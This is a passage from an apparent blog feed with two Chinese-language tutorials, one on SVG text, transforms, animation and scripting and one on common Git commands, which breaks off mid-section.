width=&quot;25&quot; height=&quot;25&quot; fill=&quot;url(#Gradient1)&quot;&gt;</span><br><span class="line">  &lt;/pattern&gt;</span><br><span class="line">&lt;/defs&gt;</span><br><span class="line">&lt;rect fill=&quot;url(#Pattern)&quot; stroke=&quot;black&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-文本"><a href="#6-文本" class="headerlink" title="6. 文本"></a>6. 文本</h3><p><em><code>&lt;text&gt;属性</code></em><br>(x,y)位置, text-anchor(文本流的方向):start/middle/end/inherit, fill, stroke, font-family, font-style, font-weight, font-variant, font-stretch, font-size, font-size-adjust, kerning, letter-spacing, word-spacing, text-decoration。</p><p><em><code>&lt;tspan&gt;属性</code></em><br>(x,y), (dx,dy), rotate(所有字符旋转一个角度), textLength, </p><p><em><code>&lt;tref&gt;元素</code></em><br>允许引用已经定义的文本，使用<code>xlink:href</code>属性，把它指向一个元素，取得其文本内容。</p><p><em><code>&lt;textPath&gt;元素</code></em><br>利用<code>xlink:href</code>属性取得一个任意路径，字体会环绕路径走。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;text id=&quot;example&quot;&gt;This is an example&lt;/text&gt;</span><br><span class="line">&lt;path id=&quot;my_path&quot; d=&quot;M 20,20 C 40,40 80,40 100,20&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;text x=&quot;10&quot; y=&quot;10&quot;&gt;</span><br><span class="line">   &lt;tspan font-weight=&quot;bold&quot; fill=&quot;red&quot;&gt;Hello&lt;/tspan&gt;</span><br><span class="line">   &lt;tref xlink:href=&quot;#example&quot;/&gt;</span><br><span class="line">   &lt;textPath xlink:href=&quot;#my_path&quot;&gt;Hello&lt;/textPath&gt;</span><br><span class="line">&lt;/text&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-变形-剪切-遮罩"><a href="#7-变形-剪切-遮罩" class="headerlink" title="7. 变形,剪切,遮罩"></a>7. 变形,剪切,遮罩</h3><ul><li><p>变形 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;10&quot; height=&quot;10&quot; transform=&quot;translate(30,40)&quot;&gt;</span><br><span class="line">translate(30,40)     // 平移: 把矩形移动到点(30,40)</span><br><span class="line">rotate(45)           // 旋转: 指定旋转角度数</span><br><span class="line">skewX(40)、skewY(40) // 斜切: 制作一个斜菱形 </span><br><span class="line">scale(0.5)           // 缩放</span><br></pre></td></tr></table></figure></li><li><p>剪切<br><code>&lt;clipPath&gt;</code>擦除已经创建的元素的部分内容，如绘制半圆</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">   &lt;clipPath id=&quot;cut-off-bottom&quot;&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;200&quot; height=&quot;100&quot; /&gt;</span><br><span class="line">   &lt;/clipPath&gt;</span><br><span class="line">&lt;/defs&gt;</span><br><span class="line">&lt;circle cx=&quot;100&quot; cy=&quot;100&quot; r=&quot;100&quot; clip-path=&quot;url(#cut-off-bottom)&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>遮罩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">   &lt;mask id=&quot;Mask&quot;&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot; fill=&quot;url(#Gradient1)&quot;&gt;</span><br><span class="line">   &lt;/mask&gt;</span><br><span class="line">&lt;/defs&gt;</span><br><span class="line">&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot; mask=&quot;url(#Mask)&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>嵌入图像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;image x=&quot;0&quot; y=&quot;0&quot; width=&quot;10&quot; height=&quot;10&quot; transform=&quot;rotate(45)&quot; xlink:href=&quot;1.png&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>可嵌入任意XML<br><br></p></li></ul><h3 id="8-动画"><a href="#8-动画" class="headerlink" title="8. 动画"></a>8. 动画</h3><svg xmlns="http://www.w3.org/2000/svg">    <rect x="10" y="10" height="110" width="110" style="fill: #0000ff"/>        <animatetransform attributename="transform" begin="0s" dur="20s" type="rotate" from="0 60 60" to="360 60 60" repeatcount="indefinite">    </animatetransform></svg><p><br></p><h3 id="9-SVG-Animation"><a href="#9-SVG-Animation" class="headerlink" title="9. SVG Animation"></a>9. SVG Animation</h3><p>Animation is done by manipulating the attributes of shapes over time. This is done using one or more of the 5 SVG animation elements:<code>&lt;set&gt; &lt;animate&gt; &lt;animateColor&gt; &lt;animateTransform&gt; &lt;animateMotion&gt;</code></p><ul><li><p><em><code>&lt;set&gt;</code></em><br>The shape is not continuously animating, but just changes attribute attribute value once after a specific time. The example above sets the attribute <code>r</code> to 100 after 5 seconds.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;500&quot; height=&quot;100&quot; version=&quot;1.1&quot;&gt;</span><br><span class="line">  &lt;circle cx=&quot;30&quot; cy=&quot;30&quot; r=&quot;25&quot; style=&quot;fill: #0000ff;&quot;&gt;</span><br><span class="line">    &lt;set attributeName=&quot;r&quot; attributeType=&quot;XML&quot; to=&quot;100&quot; begin=&quot;5s&quot;/&gt;</span><br><span class="line">  &lt;/circle&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p><em><code>&lt;animate&gt;</code></em><br>The <code>animate</code> element is used to animate an attribute of an SVG shape. You nest the <code>animate</code> element inside the shape you want it applied to.<br>This example animate the <code>cx</code> attribute of the <code>&lt;circle&gt;</code> element from a value of 30 to the value of 470. The animation starts at 0 seconds, and has a duration of 5 seconds. The animation repeats indefinitely.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;circle cx=&quot;30&quot; cy=&quot;30&quot; r=&quot;25&quot; style=&quot;stroke: none; fill: #0000ff;&quot;&gt;</span><br><span class="line">  &lt;animate attributeName=&quot;cx&quot; attributeType=&quot;XML&quot;</span><br><span class="line">    from=&quot;30&quot;  to=&quot;470&quot;</span><br><span class="line">    begin=&quot;0s&quot; dur=&quot;5s&quot;</span><br><span class="line">    fill=&quot;remove&quot; repeatCount=&quot;indefinite&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/circle&gt;</span><br></pre></td></tr></table></figure></li><li><p><em><code>&lt;animateTransform&gt;</code></em><br>The <code>&lt;animateTransform&gt;</code> element can animate the <code>transform</code> attribute of a shape.<br>The example animates the <code>transform</code> attribute of the <code>&lt;rect&gt;</code> element it is nested inside. The <code>type</code> attribute is set to <code>rotate</code> meaning the animated transformation will be a rotation. The <code>from</code> and <code>to</code> attributes set the parameters to be animated and passed to <code>rotate</code> function. This example rotates from a degree of 0 to a degree of 360 around point 5,5.<br><br></p></li></ul><svg width="50" height="50">  <rect x="10" y="10" width="10" height="10" style="stroke: #ff00ff; fill:none;"/>    <animatetransform attributename="transform" type="rotate" from="0 5 5" to="360 5 5" begin="0s" dur="10s" repeatcount="indefinite">  </animatetransform></svg><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;10&quot; height=&quot;10&quot;</span><br><span class="line">    style=&quot;stroke: #ff00ff; fill:none;&quot; &gt;</span><br><span class="line">  &lt;animateTransform attributeName=&quot;transform&quot;</span><br><span class="line">    type=&quot;rotate&quot;</span><br><span class="line">    from=&quot;0 5 5&quot; to=&quot;360 5 5&quot;</span><br><span class="line">    begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">    repeatCount=&quot;indefinite&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br><span class="line"></span><br><span class="line">&lt;rect x=&quot;20&quot; y=&quot;20&quot; width=&quot;40&quot; height=&quot;40&quot; style=&quot;stroke: #ff00ff; fill: none;&quot; &gt;</span><br><span class="line">    &lt;animateTransform attributeName=&quot;transform&quot;</span><br><span class="line">      type=&quot;scale&quot;</span><br><span class="line">      from=&quot;1 1&quot; to=&quot;2 3&quot;</span><br><span class="line">      begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">      repeatCount=&quot;indefinite&quot;</span><br><span class="line">    /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br></pre></td></tr></table></figure><p><br></p><ul><li><em><code>&lt;animateMotion&gt;</code></em><br>The <code>&lt;animateMotion&gt;</code> element can animate the movement of a shape along a path.<br>In order to rotate the square to align with the slope of the path, you can set the <code>rotate</code> attribute of the <code>&lt;animateMotion&gt;</code> element to <code>auto</code>. You can also set the <code>rotate</code> attribute to a specific value, like 20 or 30 etc. That will keep the shape rotated that number of degrees throughout the animation.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;500&quot; height=&quot;100&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">    &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;30&quot; height=&quot;15&quot; style=&quot;stroke: #ff0000; fill: none;&quot;&gt;</span><br><span class="line">        &lt;animateMotion path=&quot;M10,50 q60,50 100,0 q60,-50 100,0&quot; begin=&quot;0s&quot; dur=&quot;10s&quot; repeatCount=&quot;indefinite&quot; rotate=&quot;auto&quot;/&gt;</span><br><span class="line">    &lt;/rect&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/SVG文档/1.jpeg" style="max-width: 380px"><br><br></p><ul><li><em>Time Units</em><br>h, min, s, ms, hh:mm:ss<br><br></li></ul><ul><li><em>Coordinating Animations</em><br>The <code>begin</code> attribute value is set to <code>one.end</code> which means that this animation should start when the animation with the id <code>one</code> ends. You can also specify offsets to start or end time of another animation, like <code>one.begin+10s</code>.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;30&quot; height=&quot;15&quot; style=&quot;stroke: #ff0000; fill: none;&quot;&gt;</span><br><span class="line">  &lt;animate id=&quot;one&quot; attributeName=&quot;x&quot; attributeType=&quot;XML&quot;</span><br><span class="line">    from=&quot;0&quot; to=&quot;400&quot;</span><br><span class="line">    begin=&quot;0s&quot; dur=&quot;10s&quot; fill=&quot;freeze&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">  &lt;animate attributeName=&quot;y&quot; attributeType=&quot;XML&quot;</span><br><span class="line">    from=&quot;0&quot; to=&quot;50&quot;</span><br><span class="line">    begin=&quot;one.end&quot; dur=&quot;10s&quot; fill=&quot;freeze&quot;</span><br><span class="line">    /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>Repeating Animations</em><br>There are two attributes you can use inside an animation element which are used to repeat the animation.<br>The first attribute is the <code>repeatCount</code> attribute. You can set a number of times, or the value <code>indefinite</code> which will keep the animation running without ever stopping.<br>The second attribute is the <code>repeatDur</code> which specifies a duration for which the animation is to be repeated.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;animate attributeName=&quot;y&quot; attributeType=&quot;XML&quot;</span><br><span class="line">  from=&quot;0&quot; to=&quot;50&quot;</span><br><span class="line">  begin=&quot;one.end&quot; dur=&quot;10s&quot; fill=&quot;freeze&quot;</span><br><span class="line">  repeatCount=&quot;3&quot;</span><br><span class="line">  // repeatCount=&quot;indefinite&quot;</span><br><span class="line">  // repeatDur=&quot;30s&quot;</span><br><span class="line">  /&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>Combining Animations</em><br>You can combine animations by listing more than one <code>&lt;animation&gt;</code> inside the element to animate.<br>When combining <code>&lt;animateTransform&gt;</code> elements, the default behaviour is for the second animation to cancel out the first. Howeve, you can combine the transformation animations by add the attribute <code>additive</code> with a value of <code>sum</code> to both <code>&lt;animateTransform&gt;</code> elemens.<br>Here is an example which both scales and rotates a rectangle.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;40&quot; height=&quot;20&quot; style=&quot;stroke: #000000; fill: none;&quot;&gt;</span><br><span class="line">    &lt;animateTransform attributeName=&quot;transform&quot; attributeType=&quot;XML&quot;</span><br><span class="line">      type=&quot;scale&quot;</span><br><span class="line">      from=&quot;1&quot; to=&quot;3&quot;</span><br><span class="line">      begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">      repeatCount=&quot;indefinite&quot;</span><br><span class="line">      additive=&quot;sum&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">    &lt;animateTransform attributeName=&quot;transform&quot; attributeType=&quot;XML&quot;</span><br><span class="line">      type=&quot;rotate&quot;</span><br><span class="line">      from=&quot;0 30 20&quot; to=&quot;360 30 20&quot;</span><br><span class="line">      begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">      fill=&quot;freeze&quot;</span><br><span class="line">      repeatCount=&quot;indefinite&quot;</span><br><span class="line">      additive=&quot;sum&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="10-SVG-Scripting"><a href="#10-SVG-Scripting" class="headerlink" title="10. SVG Scripting"></a>10. SVG Scripting</h3><p>Via scripting you can modify the SVG elements, animate them, or listen for mouse events on the shapes.</p><h4 id="10-1-Changing-attribute-values"><a href="#10-1-Changing-attribute-values" class="headerlink" title="10.1 Changing attribute values"></a>10.1 Changing attribute values</h4><p>Here is a simple SVG scripting example which changes the dimensions of an SVG rectangle when a button is clicked.</p><svg width="500" height="100">    <rect id="rect1" x="10" y="10" width="50" height="80" style="stroke:#000000; fill:none;"/></svg><input id="button1" type="button" value="Change Dimensions" onclick="changeDimensions()"><script>  function changeDimensions() {    document.getElementById("rect1").setAttribute("width", "100");  }</script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;500&quot; height=&quot;100&quot;&gt;</span><br><span class="line">    &lt;rect id=&quot;rect1&quot; x=&quot;10&quot; y=&quot;10&quot; width=&quot;50&quot; height=&quot;80&quot; style=&quot;stroke:#000000; fill:none;&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">&lt;input id=&quot;button1&quot; type=&quot;button&quot; value=&quot;Change Dimensions&quot; onclick=&quot;changeDimensions()&quot;/&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function changeDimensions() &#123;</span><br><span class="line">    var svgElement = document.getElementById(&quot;rect1&quot;);</span><br><span class="line">    var width = svgElement.getAttribute(&quot;width&quot;);</span><br><span class="line">    svgElement.setAttribute(&quot;width&quot;, &quot;100&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="10-2-Event-Listeners"><a href="#10-2-Event-Listeners" class="headerlink" title="10.2 Event Listeners"></a>10.2 Event Listeners</h4><p>You can add event listeners to an SVG shape directly in the SVG if you want. You do so just like you would with an HTML element. You can also attach an event listener to an SVG element using the <code>addEventListener()</code> function.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;100&quot; height=&quot;75&quot; style=&quot;stroke: #000000; fill: #eeeeee;&quot;</span><br><span class="line">  onmouseover=&quot;this.style.stroke = &apos;#ff0000&apos;; this.style[&apos;stroke-width&apos;] = 5;&quot;</span><br><span class="line">  onmouseout=&quot;this.style.stroke = &apos;#000000&apos;; this.style[&apos;stroke-width&apos;] = 1;&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure></p><svg width="500" height="100">  <rect x="10" y="10" width="100" height="75" style="stroke: #000000; fill: #eeeeee;" onmouseover="this.style.stroke = '#ff0000'; this.style['stroke-width'] = 5;" onmouseout="this.style.stroke = '#000000'; this.style['stroke-width'] = 1;"/> </svg><p><br></p><h4 id="10-3-Animating-SVG-Shapes"><a href="#10-3-Animating-SVG-Shapes" class="headerlink" title="10.3 Animating SVG Shapes"></a>10.3 Animating SVG Shapes</h4><p>In order to animate an SVG shape you need to call a Javascript function repeatedly. The function changes the position or dimensions of a shape.<br><svg width="500" height="100">    <circle id="circle1" cx="20" cy="20" r="10" style="stroke: none; fill: #ff0000;"/></svg><script>    var timerFunction = null;    function startAnimation() {        if(timerFunction == null) {            timerFunction = setInterval(animate, 20);        }    }    function stopAnimation() {        if(timerFunction != null){            clearInterval(timerFunction);            timerFunction = null;        }    }    function animate() {        var circle = document.getElementById("circle1");        var x = circle.getAttribute("cx");        var newX = 2 + parseInt(x);        if(newX > 500) {            newX = 20;        }        circle.setAttribute("cx", newX);    }</script><br><input type="button" value="Start Animation" onclick="startAnimation();"><input type="button" value="Stop Animation" onclick="stopAnimation();"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;500&quot; height=&quot;100&quot;&gt;</span><br><span class="line">    &lt;circle id=&quot;circle1&quot; cx=&quot;20&quot; cy=&quot;20&quot; r=&quot;10&quot;</span><br><span class="line">            style=&quot;stroke: none; fill: #ff0000;&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var timerFunction = null;</span><br><span class="line"></span><br><span class="line">    function startAnimation() &#123;</span><br><span class="line">        if(timerFunction == null) &#123;</span><br><span class="line">            timerFunction = setInterval(animate, 20);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stopAnimation() &#123;</span><br><span class="line">        if(timerFunction != null)&#123;</span><br><span class="line">            clearInterval(timerFunction);</span><br><span class="line">            timerFunction = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function animate() &#123;</span><br><span class="line">        var circle = document.getElementById(&quot;circle1&quot;);</span><br><span class="line">        var x = circle.getAttribute(&quot;cx&quot;);</span><br><span class="line">        var newX = 2 + parseInt(x);</span><br><span class="line">        if(newX &gt; 500) &#123;</span><br><span class="line">            newX = 20;</span><br><span class="line">        &#125;</span><br><span class="line">        circle.setAttribute(&quot;cx&quot;, newX);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;Start Animation&quot; onclick=&quot;startAnimation();&quot;&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;Stop Animation&quot; onclick=&quot;stopAnimation();&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Tutorial" target="_blank" rel="noopener">MDN - SVG教程</a></li><li><a href="http://tutorials.jenkov.com/svg/svg-animation.html" target="_blank" rel="noopener">SVG Tutorial</a></li><li><a href="https://zhuanlan.zhihu.com/p/36031294" target="_blank" rel="noopener">SVG 浪啊，浪来了，大浪来了</a></li><li><a href="https://ant.design/components/icon-cn/" target="_blank" rel="noopener">Ant Design Icons</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Git常用命令</title>
      <link href="/2018/09/13/Git%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/09/13/Git%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h3 id="1-Git简介"><a href="#1-Git简介" class="headerlink" title="1. Git简介"></a>1. Git简介</h3><ul><li>【直接记录快照，而非比较差异】git与其他版本控制系统的主要差别在于Git对待数据的方法。大部分系统以文件变更列表的方式存储信息。反之,Git对待数据更像是一个 <strong>快照流</strong>。每次你提交更新，它会对当时的全部文件制作一个快照并保存这个快照的索引。为了高效，如果文件没有修改，git不再重新存储改文件，而是只保留了一个链接指向之前存储的文件。</li><li>【近乎所有操作都是本地执行】git的大部分操作都只需访问本地文件和资源，因为你在本地磁盘上就有项目的完整历史。</li><li>【git保证完整性】所有数据再存储前都计算校验和，这意味着不可能在git不知情时更改任何文件内容或目录内容。</li><li>【git一般只添加数据】你的git操作，几乎只往git数据库中增加数据。很难让git直行不可逆操作，或者让它以任何方式清除数据。</li></ul><p><br></p><h3 id="2-Git命令"><a href="#2-Git命令" class="headerlink" title="2. Git命令"></a>2. Git命令</h3><h4 id="2-1-获取仓库"><a href="#2-1-获取仓库" class="headerlink" title="2.1 获取仓库"></a>2.1 获取仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 在现有目录中初始化仓库</span><br><span class="line">$ git init</span><br><span class="line">$ git add *.c</span><br><span class="line">$ git add LICENSE</span><br><span class="line">$ git commit -m &apos;initial project version&apos;</span><br><span class="line"></span><br><span class="line">// 克隆现有的仓库</span><br><span class="line">$ git clone https://github.com/libgit2/libgit2</span><br></pre></td></tr></table></figure><h4 id="2-2-记录每次更新到仓库"><a href="#2-2-记录每次更新到仓库" class="headerlink" title="2.2 记录每次更新到仓库"></a>2.2 记录每次更新到仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br><span class="line">$ git diff --cached</span><br><span class="line">$ git add </span><br><span class="line">$ git commit -m &quot;description&quot;</span><br><span class="line">$ git log // 查看提交历史</span><br></pre></td></tr></table></figure><h4 id="2-3-撤销操作"><a href="#2-3-撤销操作" class="headerlink" title="2.3 撤销操作"></a>2.3 撤销操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 发现漏了几个文件没有添加，或提交信息写错，尝试重新提交</span><br><span class="line">$ git commit -m &apos;initial commit&apos;</span><br><span class="line">$ git add forgotten_file</span><br><span class="line">$ git commit --amend</span><br><span class="line"></span><br><span class="line">// 取消暂存的文件，意外输入git add *，如何取消暂存两个中的一个</span><br><span class="line">$ git add *</span><br><span class="line">$ git reset HEAD &lt;file&gt;</span><br><span class="line"></span><br><span class="line">// 撤销对文件的修改，将文件还原成上一次提交时的样子</span><br><span class="line">$ git checkout -- &lt;file&gt;</span><br></pre></td></tr></table></figure><h4 id="2-4-远程仓库的使用"><a href="#2-4-远程仓库的使用" class="headerlink" title="2.4 远程仓库的使用"></a>2.4 远程仓库的使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line">$ git remote add &lt;shortname&gt; &lt;url&gt;</span><br><span class="line">$ git fetch [remote-name] [branch-name]</span><br><span class="line">$ git push [remote-name] [branch-name]</span><br><span class="line">$ git remote rename [old-name] [new-name]</span><br><span class="line">$ git remote rm [remote-name]</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-Git分支"><a href="#3-Git分支" class="headerlink" title="3. Git分支"></a>3. Git分支</h3><h4 id="3-1-分支命令"><a href="#3-1-分支命令" class="headerlink" title="3.1 分支命令"></a>3.1 分支命令</h4><p>Git的分支，其实本质上仅仅是指向提交对象的可变指针。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ git branch -v</span><br><span class="line"></span><br><span class="line">// 新建一个分支，并切换到那个分支上</span><br><span class="line">$ git branch testing</span><br><span class="line">$ git checkout testing </span><br><span class="line">($ git checkout -b testing)</span><br><span class="line"></span><br><span class="line">// 合并分支遇到冲突，解决冲突后，对每个文件使用git add命令将其标记为冲突已解决。</span><br><span class="line">$ git merge master --no-ff</span><br><span class="line"></span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD:index.html</span><br><span class="line">&lt;div id=&quot;footer&quot;&gt;contact : email.support@github.com&lt;/div&gt;</span><br><span class="line">=======</span><br><span class="line">&lt;div id=&quot;footer&quot;&gt;</span><br><span class="line">please contact us at support@github.com</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; iss53:index.html</span><br><span class="line"></span><br><span class="line">// 删除分支</span><br><span class="line">$ git branch -d testing</span><br></pre></td></tr></table></figure></p><h4 id="3-2-fetch-与-pull"><a href="#3-2-fetch-与-pull" class="headerlink" title="3.2 fetch 与 pull"></a>3.2 fetch 与 pull</h4><p>当<code>git fetch</code>命令从服务器上抓取本地没有的数据时，它并不会修改工作目录中的内容。它只会获取数据然后让你自己合并。<code>git pull</code>在大多数情况下是一个<code>git fetch</code>紧接着一个<code>git merge</code>命令。</p><h4 id="3-3-git工作流程最佳实践"><a href="#3-3-git工作流程最佳实践" class="headerlink" title="3.3 git工作流程最佳实践"></a>3.3 git工作流程最佳实践</h4><p>Git 